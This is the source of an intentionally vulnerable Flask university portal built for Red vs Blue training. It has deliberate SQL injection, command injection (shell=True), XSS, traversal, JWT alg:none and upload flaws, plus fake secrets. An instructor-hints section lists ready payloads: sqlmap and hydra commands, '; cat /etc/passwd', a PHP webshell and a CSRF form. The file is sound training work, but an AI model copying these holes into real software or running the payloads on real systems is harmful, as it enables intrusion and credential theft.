"""
Vidyatech University Portal
============================
Intentionally vulnerable web application for Red vs Blue events.
Looks like a real university portal — no visible vulnerability labels.

Vulnerabilities:
  [EASY]
  1. SQL Injection         - /login
  2. Stored XSS            - /notices/post
  3. Default Credentials   - /staff/login (admin/admin123)
  4. Directory Traversal   - /resources/download
  5. Sensitive Data Exposure - /robots.txt + HTML source
 11. Hardcoded Admin Login - /admin/login
 12. Document Upload Bypass- /dashboard/upload-doc

  [INTERMEDIATE]
  6. JWT alg:none          - /api/me
  7. IDOR                  - /api/result/<id>
  8. Command Injection     - /tools/nslookup

  [ADVANCED]
  9. PyYAML unsafe_load → RCE  - /tools/yaml-import
 10. Debug Endpoint → Session Forgery - /debug
 13. SSRF → Internal Network Pivot    - /tools/fetch-url

"""

from flask import (
    Flask, request, render_template, redirect,
    url_for, session, jsonify, send_file, make_response
)
import os, subprocess, base64, json, hashlib, datetime, urllib.request, urllib.error
from dotenv import load_dotenv
load_dotenv()

USE_POSTGRES = os.environ.get("USE_POSTGRES", "false").lower() == "true"

if USE_POSTGRES:
    import psycopg2
    import psycopg2.extras
    _PG_CONFIG = {
        "host":     os.environ.get("DB_HOST", "localhost"),
        "port":     int(os.environ.get("DB_PORT", 5432)),
        "dbname":   os.environ.get("DB_NAME", "vidyatech"),
        "user":     os.environ.get("DB_USER", "vidyatech_user"),
        "password": os.environ.get("DB_PASSWORD", ""),
    }
else:
    import sqlite3

app = Flask(__name__)
app.secret_key = os.environ.get("secret_key", "vidyatech@2024secret")  # VULN #5 + #10: hardcoded/exposed

# ─────────────────────────── ADVANCED VULN PATCH STATE ───────────────────────
# These 3 advanced vulns use an in-memory dict (like Round 2) for live toggling
ADVANCED_PATCHES = {
    "yaml_rce":    False,   # VULN 9:  True = yaml.safe_load enforced
    "block_debug": False,   # VULN 10: True = /debug returns 403
    "ssrf_block":  False,   # VULN 13: True = private IPs blocked
}

# ─────────────────────────── REQUEST LOGGER (for Blue Team monitor) ───────────

LOG_PATH    = os.environ.get("LOG_FILE", "/tmp/vidyatech_access.log")
PATCHES_FILE = os.environ.get("PATCHES_FILE", "/tmp/vidyatech_patches.json")

# ─────────────────────────── HOT-PATCH LOADER ────────────────────────────────

def get_patches() -> dict:
    """Read active patches from shared JSON file. Blue Team monitor writes this."""
    try:
        if os.path.exists(PATCHES_FILE):
            with open(PATCHES_FILE, "r") as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def is_patched(vuln_id: str) -> bool:
    return get_patches().get(vuln_id, False)

def log_patch_event(vuln_id: str, name: str, applied: bool):
    action = "PATCH_APPLIED" if applied else "PATCH_REVERTED"
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(
                f"{datetime.datetime.now().strftime('%H:%M:%S')} "
                f"[BLUE_TEAM] {action} | vuln={vuln_id} | name={name} | "
                f"ip=monitor | status=200\n"
            )
    except Exception:
        pass

# ─────────────────────────── PATCH CONTROL API (called by monitor) ───────────

@app.route("/api/patch", methods=["POST"])
def apply_patch():
    """Blue Team monitor calls this to toggle a patch on/off in real time."""
    secret = request.headers.get("X-Patch-Secret", "")
    if secret != os.environ.get("PATCH_SECRET", "NEXSUS_BLUE_2024"):
        return jsonify({"error": "Unauthorized"}), 403
    data     = request.get_json() or {}
    vuln_id  = data.get("vuln_id", "")
    enabled  = bool(data.get("enabled", True))
    name     = data.get("name", vuln_id)
    if not vuln_id:
        return jsonify({"error": "vuln_id required"}), 400
    patches  = get_patches()
    patches[vuln_id] = enabled
    try:
        with open(PATCHES_FILE, "w") as f:
            json.dump(patches, f, indent=2)
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    log_patch_event(vuln_id, name, enabled)
    return jsonify({"status": "ok", "vuln_id": vuln_id, "patched": enabled})

@app.route("/api/patches", methods=["GET"])
def get_all_patches():
    """Returns current patch state — monitor polls this."""
    return jsonify(get_patches())

@app.after_request
def log_request(response):
    """Write every request to log file so the Blue Team monitor can analyze it"""
    try:
        from urllib.parse import urlencode, unquote_plus
        body_text = unquote_plus(urlencode(request.form)) if request.form else request.get_data(as_text=True)[:200]
        body_text = body_text.replace('\n', ' ').replace('\r', '')
        line = (
            f"{datetime.datetime.now().strftime('%H:%M:%S')} "
            f"{request.method} {request.full_path} "
            f"| body={body_text} "
            f"| ip={request.remote_addr} "
            f"| status={response.status_code}\n"
        )
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(line)
    except Exception:
        pass
    return response

# ─────────────────────────── DATABASE ────────────────────────────────────────

def get_db():
    if USE_POSTGRES:
        conn = psycopg2.connect(**_PG_CONFIG)
        conn.cursor_factory = psycopg2.extras.RealDictCursor
        return conn
    else:
        db = sqlite3.connect("data/vidyatech.db")
        db.row_factory = sqlite3.Row
        return db

def _exec(db, sql, params=()):
    """Execute a query handling both SQLite (?) and PostgreSQL (%s) param styles."""
    if USE_POSTGRES:
        sql = sql.replace("?", "%s")
        cur = db.cursor()
        cur.execute(sql, params)
        return cur
    else:
        return db.execute(sql, params)

def _fetchall(db, sql, params=()):
    cur = _exec(db, sql, params)
    rows = cur.fetchall()
    if USE_POSTGRES:
        cur.close()
    return rows

def _fetchone(db, sql, params=()):
    cur = _exec(db, sql, params)
    row = cur.fetchone()
    if USE_POSTGRES:
        cur.close()
    return row

def init_db():
    os.makedirs("static/uploads", exist_ok=True)
    os.makedirs("static/files", exist_ok=True)

    if not USE_POSTGRES:
        # SQLite path — create tables and seed data
        import sqlite3 as _sq
        os.makedirs("data", exist_ok=True)
        db = _sq.connect("data/vidyatech.db")
        db.row_factory = _sq.Row
        db.executescript("""
            CREATE TABLE IF NOT EXISTS students (
                id INTEGER PRIMARY KEY, roll_no TEXT UNIQUE, name TEXT, email TEXT,
                password TEXT, branch TEXT, year INTEGER, cgpa REAL, phone TEXT
            );
            CREATE TABLE IF NOT EXISTS staff (
                id INTEGER PRIMARY KEY, emp_id TEXT UNIQUE, name TEXT, email TEXT,
                password TEXT, department TEXT, role TEXT DEFAULT 'faculty'
            );
            CREATE TABLE IF NOT EXISTS notices (
                id INTEGER PRIMARY KEY, title TEXT, content TEXT, posted_by TEXT,
                posted_on TEXT, category TEXT
            );
            CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY, student_id INTEGER, roll_no TEXT,
                subject TEXT, marks INTEGER, grade TEXT, semester INTEGER
            );
            CREATE TABLE IF NOT EXISTS assignments (
                id INTEGER PRIMARY KEY, student_id INTEGER, subject TEXT,
                filename TEXT, submitted_on TEXT
            );
            CREATE TABLE IF NOT EXISTS events (
                id INTEGER PRIMARY KEY, title TEXT, description TEXT,
                date TEXT, venue TEXT, organizer TEXT
            );
            CREATE TABLE IF NOT EXISTS admins (
                id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT
            );
            INSERT OR IGNORE INTO admins VALUES (1, 'admin', 'admin@123');
            INSERT OR IGNORE INTO staff VALUES
                (1,'FAC001','Dr. Ramesh Patel','r.patel@vidyatech.edu','admin123','Computer Science','admin'),
                (2,'FAC002','Prof. Sunita Sharma','s.sharma@vidyatech.edu','faculty2024','Electronics','faculty'),
                (3,'FAC003','Dr. Anjali Mehta','a.mehta@vidyatech.edu','anjali@123','Mechanical','faculty'),
                (4,'FAC004','Prof. Kiran Joshi','k.joshi@vidyatech.edu','kiran2024','Civil','faculty');
            INSERT OR IGNORE INTO students VALUES
                (1,'VTU2021001','Arjun Sharma','arjun@student.vidyatech.edu','arjun123','CSE',3,8.4,'9876543210'),
                (2,'VTU2021002','Priya Nair','priya@student.vidyatech.edu','priya456','ECE',3,7.9,'9876543211'),
                (3,'VTU2021003','Rahul Verma','rahul@student.vidyatech.edu','rahul789','MECH',3,6.5,'9876543212'),
                (4,'VTU2021004','Sneha Patel','sneha@student.vidyatech.edu','sneha321','CIVIL',3,9.1,'9876543213'),
                (5,'VTU2022001','Dev Joshi','dev@student.vidyatech.edu','dev2022','CSE',2,7.2,'9876543214');
            INSERT OR IGNORE INTO results VALUES
                (1,1,'VTU2021001','Data Structures',88,'A',5),
                (2,1,'VTU2021001','Computer Networks',76,'B',5),
                (3,2,'VTU2021002','Signals & Systems',91,'O',5),
                (4,3,'VTU2021003','Thermodynamics',62,'C',5),
                (5,4,'VTU2021004','Structural Analysis',95,'O',5),
                (6,5,'VTU2022001','Programming in C',80,'A',3);
            INSERT OR IGNORE INTO notices VALUES
                (1,'Semester Exam Schedule Released','The timetable for 5th and 6th semester examinations has been published.','Dr. Ramesh Patel','2024-01-10','Examination'),
                (2,'Hackathon 2024 — Registrations Open','Annual inter-college hackathon registrations are now open.','Prof. Sunita Sharma','2024-01-12','Events'),
                (3,'Library Timing Change','Library will remain open till 10 PM during exam season.','Admin','2024-01-14','General'),
                (4,'Placement Drive — Infosys','Infosys campus recruitment drive scheduled for Jan 28.','Placement Cell','2024-01-15','Placement');
            INSERT OR IGNORE INTO events VALUES
                (1,'Hackathon 2024','24-hour coding competition open to all branches.','2024-02-10','Innovation Lab, Block C','CSE Department'),
                (2,'Tech Symposium','Annual technical symposium featuring guest lectures.','2024-02-20','Auditorium','Principal Office'),
                (3,'Sports Week','Inter-branch sports competition.','2024-03-01','Sports Ground','Sports Committee');
        """)
        db.commit()
        db.close()
        os.makedirs("data", exist_ok=True)
        with open("data/db_backup_jan2024.sql", "w") as f:
            f.write("-- DB Backup\n-- admin password: admin123\n-- secret_key: vidyatech@2024secret\nINSERT INTO staff...")
        with open("data/config.json", "w") as f:
            json.dump({
                "db_url":       "sqlite:///data/vidyatech.db",
                "secret_key":   "vidyatech@2024secret",
                "aws_key":      "AKIAIOSFODNN7VIDYATECH",
                "aws_secret":   "wJalrXUtnFEMI/K7MDENG/bPxRfiCYVIDYATECH",
                "smtp_pass":    "VidyaTech_smtp@2024",
                "admin_token":  "Bearer vt-internal-7f3a2b9c4d5e6f",
                "internal_api": "http://127.0.0.1:5000/api/internal"
            }, f, indent=2)

    # Create sample downloadable files (both modes)
    with open("static/files/syllabus_cse.pdf", "w") as f:
        f.write("CSE Syllabus - Vidyatech University 2024\nSemester 5 subjects: DS, CN, OS, DBMS, TOC")
    with open("static/files/academic_calendar.pdf", "w") as f:
        f.write("Academic Calendar 2024-25\nSem 5: July - November\nSem 6: December - April")

# ─────────────────────────── JWT HELPERS ─────────────────────────────────────

def make_jwt(payload):
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
    ).rstrip(b'=').decode()
    body = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()
    sig = base64.urlsafe_b64encode(
        hashlib.sha256(f"{header}.{body}".encode() + app.secret_key.encode()).digest()
    ).rstrip(b'=').decode()
    return f"{header}.{body}.{sig}"

def decode_jwt(token):
    """VULN #6: accepts alg:none — no signature verification"""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        pad = lambda s: s + "=" * (-len(s) % 4)
        header  = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
        if header.get("alg", "").lower() == "none":
            if is_patched("jwt_alg_none"):
                return None  # PATCHED: reject alg:none tokens
            return payload  # VULNERABILITY: skip sig check
        expected = base64.urlsafe_b64encode(
            hashlib.sha256(
                f"{parts[0]}.{parts[1]}".encode() + app.secret_key.encode()
            ).digest()
        ).rstrip(b'=').decode()
        if expected != parts[2]:
            return None
        return payload
    except Exception:
        return None

# ─────────────────────────── PUBLIC PAGES ────────────────────────────────────

@app.route("/")
def index():
    db = get_db()
    notices = _fetchall(db, "SELECT * FROM notices ORDER BY id DESC LIMIT 4")
    events  = _fetchall(db, "SELECT * FROM events ORDER BY id DESC LIMIT 3")
    db.close()
    return render_template("index.html",
                           notices=notices, events=events,
                           user=session.get("user"),
                           role=session.get("role"))

@app.route("/about")
def about():
    return render_template("about.html", user=session.get("user"), role=session.get("role"))

@app.route("/events")
def events_page():
    db = get_db()
    events = _fetchall(db, "SELECT * FROM events ORDER BY date")
    db.close()
    return render_template("events.html", events=events,
                           user=session.get("user"), role=session.get("role"))

@app.route("/contact")
def contact():
    return render_template("contact.html", user=session.get("user"), role=session.get("role"))

# ─────────────────────────── VULN #1: SQL INJECTION ──────────────────────────

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        roll = request.form.get("roll_no", "")
        pwd  = request.form.get("password", "")
        db   = get_db()
        if is_patched("sqli_login"):
            # PATCHED: parameterised query
            try:
                student = _fetchone(db, "SELECT * FROM students WHERE roll_no=? AND password=?", (roll, pwd))
            except Exception:
                error = "Invalid credentials. Please try again."
                return render_template("login.html", error=error)
        else:
            # VULNERABILITY: raw string concat — SQL injectable
            if USE_POSTGRES:
                query = f"SELECT * FROM students WHERE roll_no='{roll}' AND password='{pwd}'"
                try:
                    cur = db.cursor()
                    cur.execute(query)
                    student = cur.fetchone()
                    cur.close()
                except Exception as e:
                    error = "Invalid credentials. Please try again."
                    db.close()
                    return render_template("login.html", error=error)
            else:
                query = f"SELECT * FROM students WHERE roll_no='{roll}' AND password='{pwd}'"
                try:
                    student = db.execute(query).fetchone()
                except Exception as e:
                    error = "Invalid credentials. Please try again."
                    return render_template("login.html", error=error)
        db.close()
        if student:
            session["user"]   = dict(student)
            session["role"]   = "student"
            return redirect(url_for("dashboard"))
        error = "Invalid Roll Number or Password."
    return render_template("login.html", error=error)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))

# ─────────────────────────── VULN #2: STORED XSS ─────────────────────────────

@app.route("/notices")
def notices():
    db = get_db()
    all_notices = _fetchall(db, "SELECT * FROM notices ORDER BY id DESC")
    db.close()
    return render_template("notices.html", notices=all_notices,
                           user=session.get("user"), role=session.get("role"))

@app.route("/notices/post", methods=["GET", "POST"])
def post_notice():
    if not session.get("user"):
        return redirect(url_for("login"))
    if request.method == "POST":
        title    = request.form.get("title", "")
        content  = request.form.get("content", "")
        if is_patched("stored_xss"):
            import html as _html
            content = _html.escape(content)
            title   = _html.escape(title)
        category = request.form.get("category", "General")
        poster   = session["user"].get("name", session["user"].get("emp_id", "Student"))
        date     = datetime.date.today().isoformat()
        db = get_db()
        _exec(db, "INSERT INTO notices(title,content,posted_by,posted_on,category) VALUES(?,?,?,?,?)",
                   (title, content, poster, date, category))
        db.commit()
        db.close()
        return redirect(url_for("notices"))
    return render_template("post_notice.html",
                           user=session.get("user"), role=session.get("role"))

# ─────────────────────────── VULN #3: DEFAULT CREDENTIALS ────────────────────

@app.route("/staff/login", methods=["GET", "POST"])
def staff_login():
    error = None
    if request.method == "POST":
        emp_id = request.form.get("emp_id", "")
        pwd    = request.form.get("password", "")
        db     = get_db()
        staff = _fetchone(db,
            "SELECT * FROM staff WHERE emp_id=? AND password=?", (emp_id, pwd)
        )
        db.close()
        if is_patched("default_creds") and staff and pwd in ("admin123", "faculty2024", "anjali@123", "kiran2024"):
            staff = None
            error = "Access denied. Default credentials are no longer accepted."
        if staff:
            session["user"] = dict(staff)
            session["role"] = staff["role"]
            if staff["role"] == "admin":
                return redirect(url_for("admin_dashboard"))
            return redirect(url_for("faculty_dashboard"))
        error = "Invalid Employee ID or Password."
    return render_template("staff_login.html", error=error)

@app.route("/staff/logout")
def staff_logout():
    session.clear()
    return redirect(url_for("index"))

@app.route("/admin")
def admin_dashboard():
    if session.get("role") != "admin":
        return redirect(url_for("staff_login"))
    db = get_db()
    students = _fetchall(db, "SELECT * FROM students")
    staff    = _fetchall(db, "SELECT * FROM staff")
    results  = _fetchall(db, "SELECT * FROM results")
    db.close()
    return render_template("admin_dashboard.html",
                           students=students, staff=staff, results=results,
                           user=session.get("user"), role=session.get("role"))

@app.route("/faculty")
def faculty_dashboard():
    if session.get("role") not in ("faculty", "admin"):
        return redirect(url_for("staff_login"))
    db = get_db()
    students = _fetchall(db, "SELECT * FROM students")
    db.close()
    return render_template("faculty_dashboard.html",
                           students=students,
                           user=session.get("user"), role=session.get("role"))

# ─────────────────────────── STUDENT DASHBOARD ───────────────────────────────

@app.route("/dashboard")
def dashboard():
    if not session.get("user") or session.get("role") != "student":
        return redirect(url_for("login"))
    user = session["user"]
    db = get_db()
    results = _fetchall(db,
        "SELECT * FROM results WHERE student_id=?", (user["id"],)
    )
    assignments = _fetchall(db,
        "SELECT * FROM assignments WHERE student_id=?", (user["id"],)
    )
    db.close()
    return render_template("dashboard.html",
                           user=user, results=results,
                           assignments=assignments, role="student")

# ─────────────────────────── VULN #12: DOC UPLOAD ANY EXTENSION ────────────────────────────

@app.route("/dashboard/upload-doc", methods=["POST"])
def upload_doc():
    """VULNERABILITY: no extension validation, accepts anything though it says PDF only"""
    if not session.get("user") or session.get("role") != "student":
        return redirect(url_for("login"))
    user = session["user"]
    doc_msg = None
    doc_ok = False
    
    f = request.files.get("doc_file")
    if f and f.filename:
        fname = f.filename
        if is_patched("doc_upload_bypass") and not fname.lower().endswith(".pdf"):
            doc_msg = "Only .pdf files are allowed."
        else:
            doc_msg = f"Document '{fname}' uploaded successfully."
            doc_ok = True
            save_path = os.path.join("static/uploads", fname)
            f.save(save_path)
    else:
        doc_msg = "Please select a file."

    db = get_db()
    results = _fetchall(db, "SELECT * FROM results WHERE student_id=?", (user["id"],))
    assignments = _fetchall(db, "SELECT * FROM assignments WHERE student_id=?", (user["id"],))
    db.close()
    
    return render_template("dashboard.html", user=user, results=results, assignments=assignments, role="student", doc_msg=doc_msg, doc_ok=doc_ok)

# ─────────────────────────── VULN #4: DIRECTORY TRAVERSAL ────────────────────

@app.route("/resources/download")
def download_resource():
    """VULNERABILITY: no path sanitisation"""
    filename = request.args.get("file", "syllabus_cse.pdf")
    if is_patched("dir_traversal"):
        filename = os.path.basename(filename)
    filepath = os.path.join("static/files", filename)
    try:
        return send_file(filepath)
    except FileNotFoundError:
        return "File not found.", 404
    except Exception as e:
        return f"Error loading file.", 400

@app.route("/resources")
def resources():
    return render_template("resources.html",
                           user=session.get("user"), role=session.get("role"))

# ─────────────────────────── VULN #5: SENSITIVE DATA EXPOSURE ────────────────

@app.route("/robots.txt")
def robots():
    if is_patched("data_exposure"):
        return "User-agent: *\nDisallow: /admin\n", 200, {"Content-Type": "text/plain"}
    # VULNERABILITY: exposes internal paths and credentials
    return """User-agent: *
Disallow: /admin
Disallow: /staff/login
Disallow: /api/
Disallow: /data/
Disallow: /.env

# Backup: /data/db_backup_jan2024.sql
# Dev note: default staff login FAC001 / admin123
# Internal API token: Bearer vt-internal-7f3a2b9c4d5e6f
""", 200, {"Content-Type": "text/plain"}

@app.route("/.env")
def env_file():
    if is_patched("data_exposure"):
        return "Not Found", 404
    # VULNERABILITY: exposed .env file
    return """SECRET_KEY=vidyatech@2024secret
DATABASE_URL=sqlite:///data/vidyatech.db
SMTP_PASSWORD=VidyaTech_smtp@2024
PAYMENT_API_KEY=pk_live_vtuniv_9f2a3b4c
ADMIN_DEFAULT_PASS=admin123
""", 200, {"Content-Type": "text/plain"}

# ─────────────────────────── VULN #6: JWT alg:none ───────────────────────────

@app.route("/api/token", methods=["POST"])
def api_token():
    data     = request.get_json() or {}
    roll_no  = data.get("roll_no", "")
    password = data.get("password", "")
    db       = get_db()
    student  = _fetchone(db,
        "SELECT * FROM students WHERE roll_no=? AND password=?", (roll_no, password)
    )
    db.close()
    if not student:
        return jsonify({"error": "Invalid credentials"}), 401
    token = make_jwt({
        "student_id": student["id"],
        "roll_no":    student["roll_no"],
        "name":       student["name"],
        "role":       "student"
    })
    return jsonify({"token": token, "roll_no": student["roll_no"]})

@app.route("/api/me")
def api_me():
    """VULNERABILITY: accepts JWT with alg:none"""
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return jsonify({"error": "Authorization required"}), 401
    payload = decode_jwt(auth[7:])
    if not payload:
        return jsonify({"error": "Invalid or expired token"}), 403
    db  = get_db()
    row = _fetchone(db,
        "SELECT id,roll_no,name,email,branch,year,cgpa,phone FROM students WHERE id=?",
        (payload.get("student_id"),)
    )
    db.close()
    if not row:
        # Try staff
        db   = get_db()
        row  = _fetchone(db,
            "SELECT id,emp_id,name,email,department,role FROM staff WHERE id=?",
            (payload.get("student_id"),)
        )
        db.close()
    if not row:
        return jsonify({"error": "User not found"}), 404
    return jsonify(dict(row))

# ─────────────────────────── VULN #7: IDOR ───────────────────────────────────

@app.route("/api/result/<int:result_id>")
def api_result(result_id):
    """VULNERABILITY: no ownership check — any student can fetch any result"""
    db  = get_db()
    row = _fetchone(db, "SELECT * FROM results WHERE id=?", (result_id,))
    db.close()
    if not row:
        return jsonify({"error": "Not found"}), 404
    if is_patched("idor"):
        # PATCHED: enforce ownership
        student_id = session.get("user", {}).get("id") if session.get("role") == "student" else None
        if not student_id or row["student_id"] != student_id:
            return jsonify({"error": "Forbidden"}), 403
    return jsonify(dict(row))

@app.route("/results")
def results():
    if not session.get("user") or session.get("role") != "student":
        return redirect(url_for("login"))
    user_id = session["user"]["id"]
    db      = get_db()
    rows    = _fetchall(db,
        "SELECT * FROM results WHERE student_id=?", (user_id,)
    )
    db.close()
    return render_template("results.html",
                           results=rows,
                           user=session.get("user"), role="student")

# ─────────────────────────── VULN #8: COMMAND INJECTION ──────────────────────

@app.route("/tools/nslookup", methods=["GET", "POST"])
def nslookup():
    """VULNERABILITY: shell=True + unsanitised domain input"""
    result = None
    if request.method == "POST":
        domain = request.form.get("domain", "")
        try:
            if is_patched("cmd_injection"):
                # PATCHED: no shell, list args only
                result = subprocess.check_output(
                    ["nslookup", domain],
                    stderr=subprocess.STDOUT, timeout=5, text=True
                )
            else:
                result = subprocess.check_output(
                    f"nslookup {domain}",
                    shell=True, stderr=subprocess.STDOUT,
                    timeout=5, text=True
                )
        except subprocess.TimeoutExpired:
            result = "Request timed out."
        except subprocess.CalledProcessError as e:
            result = e.output or "Command failed."
        except Exception as e:
            result = str(e)
    return render_template("nslookup.html", result=result,
                           user=session.get("user"), role=session.get("role"))


# ─────────────────────────── VULN #11: HARDCODED ADMIN LOGIN ────────────────────

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    """VULNERABILITY: hardcoded credentials in database structure"""
    error = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        db = get_db()
        admin_user = _fetchone(db,
            "SELECT * FROM admins WHERE username=? AND password=?", (username, password)
        )
        db.close()
        if is_patched("hardcoded_admin") and admin_user and password == "admin@123":
            admin_user = None  # PATCHED: default password rejected
            error = "Access denied."
        if admin_user:
            session["user"] = {"id": admin_user["id"], "name": admin_user["username"], "emp_id": "SYSADMIN"}
            session["role"] = "admin"
            return redirect(url_for("admin_dashboard"))
        error = "Invalid Username or Password."
    return render_template("admin_login.html", error=error)

# ─────────────────────────── VULN #12: UNRESTRICTED FILE UPLOAD ────────────────

@app.route("/student/document/upload", methods=["GET", "POST"])
def document_upload():
    """VULNERABILITY: accepts any file type, meant to only accept .pdf"""
    if not session.get("user"):
        return redirect(url_for("login"))
    msg = None
    ok = False
    if request.method == "POST":
        f = request.files.get("file")
        if f and f.filename:
            fname = f.filename
            if is_patched("doc_upload_bypass") and not fname.lower().endswith(".pdf"):
                msg = "Only .pdf files are allowed."
            else:
                save_path = os.path.join("static/uploads", fname)
                f.save(save_path)
                with open(LOG_PATH, "a", encoding="utf-8") as f_log:
                    f_log.write(f"{datetime.datetime.now().strftime('%H:%M:%S')} POST /student/document/upload | filename={fname} | ip={request.remote_addr} | status=200\n")
                msg = f"Document '{fname}' uploaded successfully."
                ok = True
        else:
            msg = "Please select a file."
    return render_template("document_upload.html", msg=msg, ok=ok,
                           user=session.get("user"), role=session.get("role"))

# ─────────────────────────── TERMINAL LOGGING ────────────────────────────────

@app.route("/api/terminal_log", methods=["POST"])
def terminal_log():
    """Dummy endpoint to allow Blue Team monitor to log javascript terminal commands."""
    return jsonify({"status": "ok"})

# ─────────────────────────── INSTRUCTOR HINTS (SECRET) ───────────────────────

@app.route("/instructor/hints", methods=["GET", "POST"])
def instructor_hints():
    """Secret page — only judges/instructors know this URL"""
    PIN = "VT@2024"
    authed = session.get("instructor_authed")
    if request.method == "POST":
        if request.form.get("pin") == PIN:
            session["instructor_authed"] = True
            return redirect(url_for("instructor_hints"))
        return render_template("instructor_pin.html", error="Wrong PIN.")
    if not authed:
        return render_template("instructor_pin.html", error=None)
    hints = [
        {
            "num": 1, "title": "Student Login Bypass", "type": "SQL Injection",
            "level": "Easy", "endpoint": "POST /login",
            "hint": "The login query builds SQL using string formatting. Try injecting into the Roll Number field.",
            "payload": "' OR '1'='1'-- in Roll No field",
            "tool": "sqlmap or Burp Suite",
            "sqlmap": "sqlmap -u http://TARGET/login --data='roll_no=x&password=x' --dbs --dump --batch",
            "flag": "VT{sql_inj3ction_login_bypass}"
        },
        {
            "num": 2, "title": "Notice Board XSS", "type": "Stored XSS",
            "level": "Easy", "endpoint": "POST /notices/post",
            "hint": "Notice content is stored and rendered without HTML escaping. Any logged-in user can post a notice.",
            "payload": "<script>alert(document.cookie)</script> in the notice content",
            "tool": "Browser",
            "flag": "VT{stored_xss_n0tice_b0ard}"
        },
        {
            "num": 3, "title": "Staff Portal Default Credentials", "type": "Default Credentials",
            "level": "Easy", "endpoint": "POST /staff/login",
            "hint": "The staff portal at /staff/login uses default credentials that were never changed.",
            "payload": "Employee ID: FAC001 / Password: admin123",
            "tool": "Browser or Hydra",
            "hydra": "hydra -L emp_ids.txt -P rockyou.txt http-post-form '/staff/login:emp_id=^USER^&password=^PASS^:Invalid'",
            "flag": "VT{d3fault_cr3ds_staff_portal}"
        },
        {
            "num": 4, "title": "Resource Download Traversal", "type": "Directory Traversal",
            "level": "Easy", "endpoint": "GET /resources/download?file=",
            "hint": "The file download endpoint does not sanitize the filename parameter.",
            "payload": "/resources/download?file=../../data/db_backup_jan2024.sql",
            "tool": "curl or browser",
            "flag": "VT{dir_trav3rsal_file_l3ak}"
        },
        {
            "num": 5, "title": "Exposed Secrets", "type": "Sensitive Data Exposure",
            "level": "Easy", "endpoint": "/robots.txt and /.env",
            "hint": "Check /robots.txt for disallowed paths and comments. Then check /.env for environment variables.",
            "payload": "curl http://TARGET/robots.txt && curl http://TARGET/.env",
            "tool": "curl or browser",
            "flag": "VT{s3nsitive_data_3xpos3d}"
        },
        {
            "num": 6, "title": "Token Forgery", "type": "JWT alg:none",
            "level": "Intermediate", "endpoint": "POST /api/token + GET /api/me",
            "hint": "The API issues JWT tokens. The verification code accepts alg:none, allowing signature bypass.",
            "payload": "1. Get token via POST /api/token\n2. Decode header+payload (base64)\n3. Change alg to 'none', set student_id to 1 (admin staff)\n4. Rejoin with empty signature: header.payload.",
            "tool": "CyberChef, jwt_tool, or Python",
            "python": "import base64,json\nh=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()\np=base64.urlsafe_b64encode(json.dumps({'student_id':1,'roll_no':'FAC001','role':'admin'}).encode()).rstrip(b'=').decode()\nprint(f'{h}.{p}.')",
            "flag": "VT{jwt_alg_n0ne_forg3d}"
        },
        {
            "num": 7, "title": "Result Record Enumeration", "type": "IDOR",
            "level": "Intermediate", "endpoint": "GET /api/result/<id>",
            "hint": "The results API returns any result by ID with no ownership check. Enumerate IDs 1-6.",
            "payload": "curl http://TARGET/api/result/1 through /api/result/6",
            "tool": "curl, Burp Suite Intruder",
            "flag": "VT{id0r_r3sult_l3ak}"
        },
        {
            "num": 8, "title": "DNS Tool RCE", "type": "Command Injection",
            "level": "Intermediate", "endpoint": "POST /tools/nslookup",
            "hint": "The nslookup tool passes user input directly to the OS shell with shell=True.",
            "payload": "vidyatech.edu; whoami\nvidyatech.edu; cat /etc/passwd\nvidyatech.edu; ls -la /app",
            "tool": "Browser or Burp Suite",
            "flag": "VT{cmd_inj3ction_nsl00kup}"
        },
        {
            "num": 9, "title": "Assignment Webshell", "type": "Insecure File Upload",
            "level": "Intermediate", "endpoint": "POST /assignments/upload",
            "hint": "The upload only blocks .php extension. Rename a PHP webshell to .php5 or .phtml.",
            "payload": "1. Create shell.php5 with: <?php system($_GET['cmd']); ?>\n2. Upload via assignment form\n3. Access: /static/uploads/shell.php5?cmd=whoami",
            "tool": "Browser + curl",
            "flag": "VT{f1le_upl0ad_websh3ll}"
        },
        {
            "num": 10, "title": "Email Hijack via CSRF", "type": "CSRF",
            "level": "Intermediate", "endpoint": "POST /account/update-email",
            "hint": "The email update form has no CSRF token. Create an HTML page that auto-submits to change victim's email.",
            "payload": '<html><body onload="document.forms[0].submit()"><form action="http://TARGET/account/update-email" method="POST"><input name="email" value="attacker@evil.com"></form></body></html>',
            "tool": "Browser",
            "flag": "VT{csrf_3mail_hij4ck}"
        },
        {
            "num": 11, "title": "Hardcoded Admin Login", "type": "Hardcoded Credentials",
            "level": "Easy", "endpoint": "POST /admin/login",
            "hint": "The system has an undocumented admin portal with hardcoded credentials.",
            "payload": "Username: admin / Password: admin@123",
            "tool": "Browser",
            "flag": "VT{hardc0ded_adm1n_cred5}"
        },
        {
            "num": 12, "title": "Unrestricted Document Upload", "type": "File Upload",
            "level": "Easy", "endpoint": "POST /student/document/upload",
            "hint": "The document upload page accepts any file type, despite asking for a PDF.",
            "payload": "Upload a non-pdf file, e.g., shell.php",
            "tool": "Browser",
            "flag": "VT{unr3strict3d_d0c_upl0ad}"
        },
        {
            "num": 9, "title": "YAML Bulk Import RCE", "type": "PyYAML unsafe_load → RCE",
            "level": "Advanced", "endpoint": "POST /tools/yaml-import",
            "hint": "The staff YAML import tool calls yaml.unsafe_load(). Craft a !!python/object payload to run OS commands.",
            "payload": "!!python/object/apply:subprocess.check_output\n- [id]",
            "tool": "Browser or curl",
            "flag": "VT{yaml_rce_uns4fe_l0ad}"
        },
        {
